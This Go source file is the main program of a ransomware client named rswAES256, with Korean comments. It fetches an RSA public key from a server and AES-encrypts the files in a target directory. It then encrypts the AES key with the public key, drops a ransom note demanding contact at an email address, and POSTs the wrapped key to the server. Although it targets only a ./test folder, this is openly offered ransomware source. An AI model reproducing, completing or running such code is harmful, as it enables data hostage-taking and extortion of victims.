package main

import (
	"flag"
	"fmt"
	"log"
	"path/filepath"
	"rswAES256/client"
	"rswAES256/config"
	"rswAES256/encrypt"
	"rswAES256/readme"
	"time"
)

var readmeText = `Your documents, photos and other important files have been envrypted.

the only way to decrypt your files is to receive the private key and decryption program.

to receive the private key and decryption program, you have to hire me.

for more information, Please contact jeet95@naver.com
`

var path = "./config.toml"
var filePath = "." + string(filepath.Separator) + filepath.Join("test") // OS 독립적 파일 경로(.\test)
var pathFlag = flag.String("config", path, "set toml path")

func main() {
	flag.Parse()

	// 설정파일 설정.
	c := config.NewConfig(path)
	fmt.Println(c)

	newClient := client.NewClient(c)
	// 서버로부터 public key를 가져옴.
	publicKey, err := newClient.GetPublicKey()
	if err != nil {
		log.Fatalln(err)
	}
	fmt.Println("PublicKey from server : ", *publicKey)

	//난수 키 생성.
	key, err := newClient.CreateRandomKey()
	if err != nil {
		log.Fatalln(err)
	}
	fmt.Printf("Randome key : %x\n", key)

	// test의 하위 파일들을 설정한 확장자에 따라 모두 암호화 함.
	err = newClient.AESEncryptDirectory(filePath)
	if err != nil {
		log.Fatalln(err)
	}

	//공개키로 난수 키를 암호화.
	cipherText, err := encrypt.EncryptRandomKeyWithPublicKey(key, publicKey)
	if err != nil {
		log.Fatalln(err)
	}
	//fmt.Println("cipherText:", cipherText)

	// readme.txt 생성 및 작성.
	err = readme.CreateFileReadme("./readme.txt", readmeText)
	if err != nil {
		log.Fatalln(err)
	}

	time.Sleep(time.Second * 2)
	// 공개키로 암호화된 키를 서버로 전송
	err = client.SendCipherWithPOST(cipherText)
	if err != nil {
		// 공개키로 암호화된 키를 로컬에 저장.
		err = readme.OpenFileReadme("./readme.txt", string(cipherText))
		if err != nil {
			log.Println(err)
		}
	}

	// rootPath의 하위 파일들을 복호화(확장자가.jkd으로 암호화된것만 복호화)
	//err = newClient.AESDecryptDirectory("./test/")
	//if err != nil {
	//	log.Fatalln(err)
	//}

	// AES 암호화
	//cipherText, err := encrypt.EncryptAES(data, []byte(*key))
	//if err != nil {
	//	log.Fatalln(err)
	//}
	//fmt.Printf("cipherText : %x\n", cipherText)

	// 파일 암호화
	//err = encrypt.EncryptFile("./test.txt", []byte(*key))
	//if err != nil {
	//	log.Fatalln(err)
	//}

	// 파일 확장자 변경
	//err = newClient.ChangeFileExtension("./test.txt")
	//if err != nil {
	//	log.Fatalln(err)
	//}

	// 파일 복호화
	//err = decrypt.DecryptFile("./test/abc.go", []byte(*key))
	//if err != nil {
	//	log.Fatalln()
	//}

	//AES 복호화
	//plainText, err := decrypt.DecryptAES(cipherText, []byte(*key))
	//if err != nil {
	//	log.Fatalln(err)
	//}
	//fmt.Println("plainText : ", string(plainText))

}
